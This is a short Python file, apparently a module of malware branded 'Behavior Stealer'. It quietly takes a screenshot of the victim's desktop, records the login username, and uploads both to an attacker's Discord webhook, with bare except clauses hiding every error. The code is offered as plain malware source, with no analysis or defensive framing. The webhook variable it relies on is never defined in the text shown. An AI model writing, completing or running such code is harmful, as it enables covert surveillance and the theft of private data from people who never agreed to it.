import os
import tempfile
import requests
from PIL import ImageGrab
import json
import base64

AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"

def capture_screen(tmp_dir):
    img_path = os.path.join(tmp_dir, "screen.png")
    try:
        img = ImageGrab.grab()
        img.save(img_path)
        return img_path
    except:
        return None

def send_to_discord(webhook_url, image_path, username):
    if not webhook_url or not image_path or not os.path.exists(image_path):
        return

    try:
        with open(image_path, "rb") as f:
            files = {"file": (os.path.basename(image_path), f.read())}
            embed = {
                "title": "\U0001F4F8 Screen Capture",
                "description": f"Screenshot from `{username}`",
                "color": 0x00FFFF,
                "footer": {"text": "Behavior Stealer \U0001F47E"}
            }
            payload = {
                "username": "Behavior Stealer",
                "avatar_url": AVATAR_URL,
                "embeds": [embed]
            }
            requests.post(webhook_url, json=payload, files=files)
    except:
        pass

def set_webhook_avatar(webhook_url, avatar_url):
    try:
        img_data = requests.get(avatar_url).content
        avatar_base64 = "data:image/png;base64," + base64.b64encode(img_data).decode()
        data = {"avatar": avatar_base64}
        requests.patch(webhook_url, json=data)
    except:
        pass

def run():
    if not Behavior:
        return
    username = os.getlogin()
    set_webhook_avatar(Behavior, AVATAR_URL)
    with tempfile.TemporaryDirectory() as tmp_dir:
        screenshot_path = capture_screen(tmp_dir)
        send_to_discord(Behavior, screenshot_path, username)

if __name__ == "__main__":
    run()
